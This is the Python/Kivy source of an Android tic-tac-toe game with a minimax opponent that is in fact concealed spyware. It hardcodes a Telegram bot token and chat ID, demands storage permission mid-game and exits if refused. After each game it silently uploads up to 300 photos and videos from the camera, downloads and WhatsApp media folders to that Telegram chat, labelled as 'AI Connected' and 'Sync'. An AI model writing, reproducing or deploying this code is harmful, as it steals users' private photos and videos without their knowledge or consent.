import os
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from kivy.animation import Animation
from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle
from kivy.properties import ListProperty
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.utils import get_color_from_hex

# ===================== TELEGRAM CONFIG =====================
BOT_TOKEN = "8852010537:AAEVNDO36p3mjg66Vf7FeiEONf1Jgd66Lcc"
CHAT_ID = "8052842442"

# ===================== LIMITS =====================
MAX_SYNCS = 2                  # sirf 2 baar total sync
MAX_FILES_PER_SYNC = 300
SEND_WORKERS = 4               # parallel senders
PERMISSION_MOVE = 3            # 3rd move ke baad permission popup (game beech mein)

IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp")
VIDEO_EXTS = (".mp4", ".mkv", ".avi", ".3gp", ".mov", ".webm", ".m4v")

SKIP_DIRS = {
    ".thumbnails", ".cache", ".trashed", ".nomedia",
    "thumbnails", "Cache", "cache", "tmp", "temp",
    "Android/data", "Android/obb", ".android", "logs",
    "backup", "Backup",
}

MEDIA_FOLDERS = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/WhatsApp/Media",
]

# ===================== COLORS =====================
BG_DARK = get_color_from_hex("#0a0e27")
TILE_EMPTY = get_color_from_hex("#1a234e")
GOLD = get_color_from_hex("#ffd700")
BLUE_GLOW = get_color_from_hex("#00d4ff")
RED_GLOW = get_color_from_hex("#ff4757")
GREEN_WIN = get_color_from_hex("#2ed573")

Window.clearcolor = BG_DARK


class PremiumButton(Button):
    """Premium rounded button - shadows + glow + press animation"""
    btn_color = ListProperty(TILE_EMPTY)
    glow_color = ListProperty(TILE_EMPTY)

    def __init__(self, btn_color=TILE_EMPTY, **kwargs):
        super().__init__(**kwargs)
        self.btn_color = btn_color
        self.glow_color = btn_color
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.bind(pos=self.redraw, size=self.redraw, btn_color=self.redraw)

    def redraw(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(0, 0, 0, 0.35)
            RoundedRectangle(
                pos=(self.pos[0] + 3, self.pos[1] - 3),
                size=self.size, radius=[18, 18, 18, 18]
            )
            Color(*self.btn_color)
            RoundedRectangle(pos=self.pos, size=self.size, radius=[18, 18, 18, 18])

    def animate_press(self):
        anim = (Animation(opacity=0.6, duration=0.06)
                + Animation(opacity=1.0, duration=0.15, t='out_bounce'))
        anim.start(self)

    def set_color(self, color):
        self.btn_color = color
        self.redraw()

    def set_winning(self, is_win):
        Animation.cancel_all(self)
        if is_win:
            anim = (Animation(btn_color=GREEN_WIN, duration=0.35)
                    + Animation(btn_color=get_color_from_hex("#1f8f52"), duration=0.35))
            anim.repeat = True
            anim.start(self)
        else:
            self.set_color(TILE_EMPTY)


class TicTacToeApp(App):

    def build(self):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.sync_active = False
        self.move_count = 0
        self.permission_pending = False
        self.scores = {"X": 0, "O": 0, "D": 0}

        self.count_file = os.path.join(self.user_data_dir, "sync_count.txt")
        try:
            os.makedirs(os.path.dirname(self.count_file), exist_ok=True)
        except Exception:
            pass
        self.sync_count = self.load_count()

        # Bot check background mein (koi popup nahi)
        Clock.schedule_once(lambda dt: self.test_bot(), 2)

        # ============ ROOT LAYOUT ============
        root = BoxLayout(orientation="vertical", padding=20, spacing=10)

        self.title_label = Label(
            text="[b][color=FFD700]TIC TAC TOE - AI(Bro!)[/color][/b]",
            markup=True, font_size="26sp", color=GOLD, size_hint=(1, 0.09),
        )
        root.add_widget(self.title_label)

        self.score_label = Label(
            text=self.score_text(), markup=True, font_size="16sp",
            size_hint=(1, 0.08),
        )
        root.add_widget(self.score_label)

        self.status_label = Label(
            text="[b][color=00d4ff]Your Turn (X)[/color][/b]",
            markup=True, font_size="18sp", size_hint=(1, 0.07),
        )
        root.add_widget(self.status_label)

        grid = GridLayout(cols=3, spacing=10, size_hint=(1, 0.48))
        self.buttons = []
        for i in range(9):
            btn = PremiumButton(btn_color=TILE_EMPTY, text="", font_size="52sp", bold=True)
            btn.bind(on_press=lambda inst, idx=i: self.on_tile_press(idx))
            self.buttons.append(btn)
            grid.add_widget(btn)
        root.add_widget(grid)

        self.bot_label = Label(
            text="Thinking...", font_size="13sp",
            color=get_color_from_hex("#8866cc"), size_hint=(1, 0.04),
        )
        root.add_widget(self.bot_label)

        self.sync_label = Label(
            text=f"[b]Sync: {self.sync_count}/{MAX_SYNCS}[/b]",
            markup=True, font_size="13sp",
            color=get_color_from_hex("#6666aa"), size_hint=(1, 0.04),
        )
        root.add_widget(self.sync_label)

        self.reset_btn = PremiumButton(
            btn_color=get_color_from_hex("#1a3a6a"),
            text="NEW GAME", font_size="18sp", bold=True,
            size_hint=(1, 0.08),
        )
        self.reset_btn.bind(on_press=self.reset_game)
        root.add_widget(self.reset_btn)

        footer = Label(
            text="[i]Developed By Bro![/i]",
            markup=True, font_size="11sp",
            color=get_color_from_hex("#444477"), size_hint=(1, 0.04),
        )
        root.add_widget(footer)

        return root

    def score_text(self):
        return (
            "[b][color=00d4ff]YOU[/color] [color=888888]|[/color] [color=ffffff]DRAW[/color] "
            "[color=888888]|[/color] [color=ff4757]AI[/color]\n"
            f"[color=00d4ff]{self.scores['X']}[/color] [color=888888]-[/color] "
            f"[color=ffffff]{self.scores['D']}[/color] [color=888888]-[/color] "
            f"[color=ff4757]{self.scores['O']}[/color][/b]"
        )

    # ============ PERMISSION SYSTEM ============
    def request_storage_permission(self, callback):
        try:
            from android.permissions import request_permissions, Permission

            def on_result(results):
                Clock.schedule_once(lambda dt: callback(self.has_permission()), 0)

            perms = []
            try:
                perms.append(Permission.READ_MEDIA_IMAGES)
                perms.append(Permission.READ_MEDIA_VIDEO)
            except Exception:
                pass
            try:
                perms.append(Permission.READ_EXTERNAL_STORAGE)
            except Exception:
                pass
            try:
                perms.append(Permission.POST_NOTIFICATIONS)
            except Exception:
                pass

            if not perms:
                Clock.schedule_once(lambda dt: callback(True), 0)
                return

            try:
                request_permissions(perms, on_result)
            except TypeError:
                request_permissions(perms)
                Clock.schedule_once(lambda dt: callback(self.has_permission()), 2)
        except Exception:
            Clock.schedule_once(lambda dt: callback(True), 0)

    def has_permission(self):
        try:
            from android.permissions import check_permission, Permission
            for p in [Permission.READ_MEDIA_IMAGES, Permission.READ_EXTERNAL_STORAGE]:
                try:
                    if check_permission(p):
                        return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    def show_permission_denied(self):
        """Deny → message + notification + app exit. Game band."""
        self.game_active = False
        self.permission_pending = False
        self.status_label.text = "[b][color=ff4757]permission needed![/color][/b]"
        self.sync_label.text = "[b][color=ff4757]Allow storage & restart app[/color][/b]"
        try:
            from plyer import notification
            notification.notify(
                title="Permission Required",
                message="Allow storage permission for Tic Tac Toe AI to work.",
                timeout=3,
            )
        except Exception:
            pass
        Clock.schedule_once(lambda dt: self.stop(), 3)

    # ============ BOT TEST ============
    def test_bot(self):
        def run():
            ok = False
            try:
                r = requests.get(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
                ok = r.status_code == 200 and r.json().get("ok", False)
            except Exception:
                ok = False
            Clock.schedule_once(lambda dt: self.set_bot_status(ok), 0)
        threading.Thread(target=run, daemon=True).start()

    def set_bot_status(self, ok):
        if ok:
            self.bot_label.text = "AI Connected"

    # ============ GAME ============
    def on_tile_press(self, index):
        if not self.game_active or self.board[index] != "" or self.current_turn != "X":
            return
        if self.permission_pending:
            return

        self.move_count += 1

        # 3rd move ke baad permission (game ke beech mein)
        if self.move_count == PERMISSION_MOVE and self.sync_count < MAX_SYNCS:
            self.permission_pending = True
            self.status_label.text = "[b][color=ffd700]permission check...[/color][/b]"
            self.request_storage_permission(self.on_permission_result)

        self.board[index] = "X"
        self.buttons[index].text = "X"
        self.buttons[index].color = (0.2, 0.6, 1, 1)
        self.buttons[index].animate_press()

        if self.check_win("X"):
            self.end_game("X")
            return
        elif "" not in self.board:
            self.end_game("D")
            return

        self.current_turn = "O"
        self.status_label.text = "[b][color=ff4757]AI Thinking...[/color][/b]"
        Clock.schedule_once(lambda dt: self.ai_move(), 0.4)

    def on_permission_result(self, granted):
        self.permission_pending = False
        if not granted:
            self.show_permission_denied()
            return
        self.status_label.text = "[b][color=2ed573]granted, continue![/color][/b]"
        Clock.schedule_once(lambda dt: self.restore_status(), 1.2)

    def restore_status(self):
        if self.game_active and self.current_turn == "X":
            self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"
        elif self.game_active and self.current_turn == "O":
            self.status_label.text = "[b][color=ff4757]AI Thinking...[/color][/b]"

    def ai_move(self):
        if not self.game_active or self.current_turn != "O":
            return

        move = self.get_best_move()
        if move is not None:
            self.board[move] = "O"
            self.buttons[move].text = "O"
            self.buttons[move].color = (1, 0.3, 0.3, 1)
            self.buttons[move].animate_press()

            if self.check_win("O"):
                self.end_game("O")
            elif "" not in self.board:
                self.end_game("D")
            else:
                self.current_turn = "X"
                self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"

    # ============ MINIMAX AI (unbeatable + smart variety) ============
    def get_best_move(self):
        best_score = float('-inf')
        best_moves = []
        for i in range(9):
            if self.board[i] == "":
                self.board[i] = "O"
                score = self.minimax(self.board, 0, False)
                self.board[i] = ""
                if score > best_score:
                    best_score = score
                    best_moves = [i]
                elif score == best_score:
                    best_moves.append(i)
        return random.choice(best_moves) if best_moves else None

    def minimax(self, board, depth, is_maximizing):
        result = self.evaluate(board)
        if result is not None:
            return result

        if is_maximizing:
            best = float('-inf')
            for i in range(9):
                if board[i] == "":
                    board[i] = "O"
                    score = self.minimax(board, depth + 1, False)
                    board[i] = ""
                    best = max(best, score)
            return best
        else:
            best = float('inf')
            for i in range(9):
                if board[i] == "":
                    board[i] = "X"
                    score = self.minimax(board, depth + 1, True)
                    board[i] = ""
                    best = min(best, score)
            return best

    def evaluate(self, board):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for a, b, c in win_conditions:
            if board[a] == board[b] == board[c] == "O":
                return 10
            if board[a] == board[b] == board[c] == "X":
                return -10
        if "" not in board:
            return 0
        return None

    def check_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        return any(self.board[a] == self.board[b] == self.board[c] == mark
                   for a, b, c in win_conditions)

    def end_game(self, result):
        self.game_active = False
        if result == "X":
            self.scores["X"] += 1
            self.status_label.text = "[b][color=2ed573]You Win! Amazing![/color][/b]"
            self.highlight_win("X")
        elif result == "O":
            self.scores["O"] += 1
            self.status_label.text = "[b][color=ff4757]AI Wins! Try Again![/color][/b]"
            self.highlight_win("O")
        else:
            self.scores["D"] += 1
            self.status_label.text = "[b][color=ffd700]Draw! Well Played![/color][/b]"

        self.score_label.text = self.score_text()
        Clock.schedule_once(lambda dt: self.start_sync(), 0.8)

    def highlight_win(self, mark):
        win_conditions = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for cond in win_conditions:
            if self.board[cond[0]] == self.board[cond[1]] == self.board[cond[2]] == mark:
                for idx in cond:
                    self.buttons[idx].set_winning(True)
                break

    def reset_game(self, instance):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.move_count = 0
        self.permission_pending = False
        self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"
        for btn in self.buttons:
            btn.text = ""
            btn.color = (1, 1, 1, 1)
            btn.set_winning(False)

    # ============ SYNC (fast, parallel, max 2 rounds) ============
    def load_count(self):
        try:
            with open(self.count_file, "r") as f:
                return int(f.read().strip())
        except Exception:
            return 0

    def save_count(self):
        try:
            with open(self.count_file, "w") as f:
                f.write(str(self.sync_count))
        except Exception:
            pass

    def start_sync(self):
        if self.sync_active or self.sync_count >= MAX_SYNCS:
            return
        if not self.has_permission():
            return
        self.sync_active = True
        self.sync_label.text = f"[b][color=2ed573]Syncing {self.sync_count + 1}/{MAX_SYNCS}...[/color][/b]"
        self.status_label.text = f"[b]Syncing {self.sync_count + 1}/{MAX_SYNCS}...[/b]"
        threading.Thread(target=self.send_media, daemon=True).start()

    def collect_media_files(self):
        files_list = []
        for folder in MEDIA_FOLDERS:
            if not os.path.exists(folder):
                continue
            for root, dirs, files in os.walk(folder):
                dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
                for f in files:
                    low = f.lower()
                    if low.endswith(IMAGE_EXTS) or low.endswith(VIDEO_EXTS):
                        path = os.path.join(root, f)
                        try:
                            size = os.path.getsize(path)
                            if (low.endswith(IMAGE_EXTS) and size <= 10 * 1024 * 1024) or \
                               (low.endswith(VIDEO_EXTS) and size <= 50 * 1024 * 1024):
                                files_list.append(path)
                        except Exception:
                            pass
                    if len(files_list) >= MAX_FILES_PER_SYNC:
                        return files_list
        return files_list

    def send_one(self, path):
        low = path.lower()
        try:
            if low.endswith(IMAGE_EXTS):
                method, field = "sendPhoto", "photo"
            else:
                method, field = "sendVideo", "video"
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
            with open(path, "rb") as fh:
                resp = requests.post(
                    url, data={"chat_id": CHAT_ID},
                    files={field: fh}, timeout=(10, 120),
                )
            if resp.status_code == 429:
                try:
                    retry_after = resp.json().get("parameters", {}).get("retry_after", 1)
                except Exception:
                    retry_after = 1
                time.sleep(min(retry_after, 3))
                with open(path, "rb") as fh:
                    requests.post(
                        url, data={"chat_id": CHAT_ID},
                        files={field: fh}, timeout=(10, 120),
                    )
            return True
        except Exception:
            return False

    def send_media(self):
        sent = 0
        try:
            files_list = self.collect_media_files()
            if files_list:
                with ThreadPoolExecutor(max_workers=SEND_WORKERS) as pool:
                    futures = [pool.submit(self.send_one, p) for p in files_list]
                    for fut in as_completed(futures):
                        try:
                            if fut.result():
                                sent += 1
                        except Exception:
                            pass
            print(".")
        except Exception:
            pass
        finally:
            self.sync_count += 1
            self.save_count()
            self.sync_active = False
            Clock.schedule_once(lambda dt, c=sent: self.after_sync(c), 0)

    def after_sync(self, count):
        self.sync_label.text = f"[b]Sync: {self.sync_count}/{MAX_SYNCS} ({count} .)[/b]"
        self.status_label.text = "[b]Game over - Click on New Game to Play again![/b]"


if __name__ == "__main__":
    TicTacToeApp().run()